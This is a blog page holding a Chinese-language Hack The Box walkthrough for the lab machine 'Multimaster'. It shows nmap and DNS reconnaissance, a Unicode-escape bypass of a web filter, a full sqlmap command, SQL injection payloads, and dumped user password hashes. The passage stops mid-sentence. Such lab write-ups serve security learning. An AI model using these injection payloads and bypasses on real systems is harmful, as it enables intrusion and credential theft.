

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="World&#39;sEnd">
  <meta name="keywords" content="">
  
    <meta name="description" content="PortInfo:快速扫描： 1234567891011121314151617181920212223242526272829Archlinux:~&#x2F;HackTheBox$ sudo nmap -p- --min-rate 10000 10.10.10.179 -Pn -oN portinfo[sudo] archlinux 的密码：Starting Nmap 7.93 ( https:&#x2F;&#x2F;nm">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB Walkthrough Multimaster">
<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Multimaster.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="PortInfo:快速扫描： 1234567891011121314151617181920212223242526272829Archlinux:~&#x2F;HackTheBox$ sudo nmap -p- --min-rate 10000 10.10.10.179 -Pn -oN portinfo[sudo] archlinux 的密码：Starting Nmap 7.93 ( https:&#x2F;&#x2F;nm">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222131735983.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222132540362.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222134519413.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222142706449.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222200932367.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222201945668.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222204303320.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222204631610.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223092643413.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223102706425.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221223103301941.png">
<meta property="article:published_time" content="2023-08-13T22:39:09.021Z">
<meta property="article:modified_time" content="2023-08-13T22:56:53.359Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Active Directory">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222131735983.png">
  
  
  
  <title>HTB Walkthrough Multimaster - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB Walkthrough Multimaster"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          33k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          278 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB Walkthrough Multimaster</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="PortInfo"><a href="#PortInfo" class="headerlink" title="PortInfo:"></a>PortInfo:</h3><p>快速扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ sudo nmap -p- --min-rate 10000 10.10.10.179 -Pn -oN portinfo<br>[sudo] archlinux 的密码：Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 12:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.179<br>Host is up (0.10s latency).<br>Not shown: 65512 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>53/tcp    open  domain<br>80/tcp    open  http<br>88/tcp    open  kerberos-sec<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>389/tcp   open  ldap<br>445/tcp   open  microsoft-ds<br>464/tcp   open  kpasswd5<br>593/tcp   open  http-rpc-epmap<br>636/tcp   open  ldapssl<br>3268/tcp  open  globalcatLDAP<br>3269/tcp  open  globalcatLDAPssl<br>3389/tcp  open  ms-wbt-server<br>5985/tcp  open  wsman<br>9389/tcp  open  adws<br>49666/tcp open  unknown<br>49667/tcp open  unknown<br>49670/tcp open  unknown<br>49675/tcp open  unknown<br>49676/tcp open  unknown<br>49679/tcp open  unknown<br>49698/tcp open  unknown<br>49707/tcp open  unknown<br></code></pre></td></tr></table></figure>

<p>识别端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ sudo nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -Pn 10.10.10.179 -O -oN portinfo.txt<br>Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 12:58 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.179<br>Host is up (0.078s latency).<br><br>PORT     STATE SERVICE      VERSION<br>53/tcp   open  domain       Simple DNS Plus<br>80/tcp   open  http         Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: MegaCorp<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-22 05:05:38Z)<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp open  mc-nmf       .NET Message Framing<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)<br>OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607<br>Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Host script results:<br>|_clock-skew: mean: 2h46m57s, deviation: 4h37m08s, median: 6m56s<br>| smb-os-discovery: <br>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>|   Computer name: MULTIMASTER<br>|   NetBIOS computer name: MULTIMASTER\x00<br>|   Domain name: MEGACORP.LOCAL<br>|   Forest name: MEGACORP.LOCAL<br>|   FQDN: MULTIMASTER.MEGACORP.LOCAL<br>|_  System time: 2022-12-21T21:05:49-08:00<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-12-22T05:05:52<br>|_  start_date: 2022-12-22T05:00:11<br>| smb-security-mode: <br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: required<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 58.11 seconds<br></code></pre></td></tr></table></figure>

<p>是台windows 2016的可能性大点，Nmap扫出来内部域是MEGACORP.LOCAL，利用目标53端口进行确认：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dig any MEGACORP.LOCAL @10.10.10.179   <br><br>; &lt;&lt;&gt;&gt; DiG 9.18.12-1-Debian &lt;&lt;&gt;&gt; any MEGACORP.LOCAL @10.10.10.179<br>;; global options: +cmd<br>;; Got answer:<br>;; WARNING: .<span class="hljs-built_in">local</span> is reserved <span class="hljs-keyword">for</span> Multicast DNS<br>;; You are currently testing what happens when an mDNS query is leaked to DNS<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 22440</span><br><span class="hljs-string">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;MEGACORP.LOCAL.                        IN      ANY</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">MEGACORP.LOCAL.         600     IN      A       10.10.10.34</span><br><span class="hljs-string">MEGACORP.LOCAL.         3600    IN      NS      multimaster.MEGACORP.LOCAL.</span><br><span class="hljs-string">MEGACORP.LOCAL.         3600    IN      SOA     multimaster.MEGACORP.LOCAL. hostmaster.MEGACORP.LOCAL. 232 900 600 86400 3600</span><br><span class="hljs-string">MEGACORP.LOCAL.         600     IN      AAAA    dead:beef::c43:a2ae:dbff:9645</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ADDITIONAL SECTION:</span><br><span class="hljs-string">multimaster.MEGACORP.LOCAL. 3600 IN     A       10.10.10.179</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 140 msec</span><br><span class="hljs-string">;; SERVER: 10.10.10.179#53(10.10.10.179) (TCP)</span><br><span class="hljs-string">;; WHEN: Mon Mar 27 14:13:07 CST 2023</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 176</span><br></code></pre></td></tr></table></figure>

<h3 id="SQL-injection："><a href="#SQL-injection：" class="headerlink" title="SQL injection："></a>SQL injection：</h3><p>在80端口运行的web服务里有一项 <strong>Colleague Finder</strong>，当搜索框提交数据为空的时候会把所有同事都遍历出来：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222131735983.png" srcset="/img/loading.gif" lazyload alt="image-20221222131735983"></p>
<p>这样就有了一份用户名字典，</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sbauer@megacorp.htb<br>okent@megacorp.htb<br>ckane@megacorp.htb<br>kpage@megacorp.htb<br>shayna@megacorp.htb<br>james@megacorp.htb<br>cyork@megacorp.htb<br>rmartin@megacorp.htb<br>zac@magacorp.htb<br>jorden@megacorp.htb<br>alyx@megacorp.htb<br>ilee@megacorp.htb<br>nbourne@megacorp.htb<br>zpowers@megacorp.htb<br>aldom@megacorp.htb<br>minato@megacorp.htb<br>egre55@megacorp.htb<br></code></pre></td></tr></table></figure>

<p>然后可以抓包找注入，有过滤：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222132540362.png" srcset="/img/loading.gif" lazyload alt="image-20221222132540362"></p>
<p>但这个过滤只是对特殊符号有规则限制，而且过滤的不多。</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222134519413.png" srcset="/img/loading.gif" lazyload alt="image-20221222134519413"></p>
<p>而且返回包里指定了编码格式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: application/json;charset=utf-8<br></code></pre></td></tr></table></figure>

<p>就可以将特殊符号进行<strong>Unicode</strong>编码，来尝试绕过，比如原先输入单引号是会被拦截的，但是如果输入Unicode编码的单引号，就直接过掉了：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222142706449.png" srcset="/img/loading.gif" lazyload alt="image-20221222142706449"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r /home/archlinux/HackTheBox/sqltest --batch --level 5 --delay 5 --risk 3 --proxy http://127.0.0.1:8080 --tamper=charunicodeescape<br></code></pre></td></tr></table></figure>

<p>SQLMap的payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:<br>---<br>Parameter: JSON <span class="hljs-comment">#1* ((custom) POST)</span><br>    Type: boolean-based blind<br>    Title: AND boolean-based blind - WHERE or HAVING clause<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27; AND 3136=3136-- JEie&quot;</span>&#125;<br><br>    Type: stacked queries<br>    Title: Microsoft SQL Server/Sybase stacked queries (comment)<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--&quot;</span>&#125;<br><br>    Type: time-based blind<br>    Title: Microsoft SQL Server/Sybase time-based blind (IF)<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27; WAITFOR DELAY &#x27;0:0:5&#x27;-- Dpvn&quot;</span>&#125;<br><br>    Type: UNION query<br>    Title: Generic UNION query (NULL) - 5 columns<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;-1791&#x27; UNION ALL SELECT 92,92,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(87)+CHAR(85)+CHAR(111)+CHAR(69)+CHAR(72)+CHAR(85)+CHAR(73)+CHAR(88)+CHAR(89)+CHAR(85)+CHAR(72)+CHAR(69)+CHAR(89)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(103)+CHAR(104)+CHAR(98)+CHAR(117)+CHAR(70)+CHAR(121)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(79)+CHAR(121)+CHAR(90)+CHAR(115)+CHAR(74)+CHAR(110)+CHAR(74)+CHAR(80)+CHAR(82)+CHAR(117)+CHAR(110)+CHAR(74)+CHAR(78)+CHAR(113)+CHAR(72)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(106)+CHAR(113),92,92-- rPjk&quot;</span>&#125;<br>---<br></code></pre></td></tr></table></figure>

<p>可以跑出岗位描述：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">+----+----------------------+----------------------+-------------+----------------------+<br>| <span class="hljs-built_in">id</span> | name                 | email                | image       | position             |<br>+----+----------------------+----------------------+-------------+----------------------+<br>| 1  | Sarina Bauer         | sbauer@megacorp.htb  | sbauer.jpg  | Junior Developer     |<br>| 2  | Octavia Kent         | okent@megacorp.htb   | okent.jpg   | Senior Consultant    |<br>| 3  | Christian Kane       | ckane@megacorp.htb   | ckane.jpg   | Assistant Manager    |<br>| 4  | Kimberly Page        | kpage@megacorp.htb   | kpage.jpg   | Financial Analyst    |<br>| 5  | Shayna Stafford      | shayna@megacorp.htb  | shayna.jpg  | HR Manager           |<br>| 6  | James Houston        | james@megacorp.htb   | james.jpg   | QA Lead              |<br>| 7  | Connor York          | cyork@megacorp.htb   | cyork.jpg   | Web Developer        |<br>| 8  | Reya Martin          | rmartin@megacorp.htb | rmartin.jpg | Tech Support         |<br>| 9  | Zac Curtis           | zac@magacorp.htb     | zac.jpg     | Junior Analyst       |<br>| 10 | Jorden Mclean        | jorden@megacorp.htb  | jorden.jpg  | Full-Stack Developer |<br>| 11 | Alyx Walters         | alyx@megacorp.htb    | alyx.jpg    | Automation Engineer  |<br>| 12 | Ian Lee              | ilee@megacorp.htb    | ilee.jpg    | Internal Auditor     |<br>| 13 | Nikola Bourne        | nbourne@megacorp.htb | nbourne.jpg | Head of Accounts     |<br>| 14 | Zachery Powers       | zpowers@megacorp.htb | zpowers.jpg | Credit Analyst       |<br>| 15 | Alessandro Dominguez | aldom@megacorp.htb   | aldom.jpg   | Senior Web Developer |<br>| 16 | MinatoTW             | minato@megacorp.htb  | minato.jpg  | CEO                  |<br>| 17 | egre55               | egre55@megacorp.htb  | egre55.jpg  | CEO                  |<br>+----+----------------------+----------------------+-------------+----------------------+<br></code></pre></td></tr></table></figure>

<p>还有哈希：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Database: Hub_DB<br>Table: Logins<br>[17 entries]<br>+----+--------------------------------------------------------------------------------------------------+----------+<br>| <span class="hljs-built_in">id</span> | password                                                                                         | username |<br>+----+--------------------------------------------------------------------------------------------------+----------+<br>| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |<br>| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |<br>| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |<br>| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |<br>| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |<br>| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |<br>| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |<br>| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |<br>| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |<br>| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |<br>| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |<br>| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |<br>| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |<br>| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |<br>| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |<br>| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |<br>| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |<br>+----+--------------------------------------------------------------------------------------------------+----------+<br></code></pre></td></tr></table></figure>

<p>但是没法直接–os-shell,而且哈希细看其实也就四串：</p>
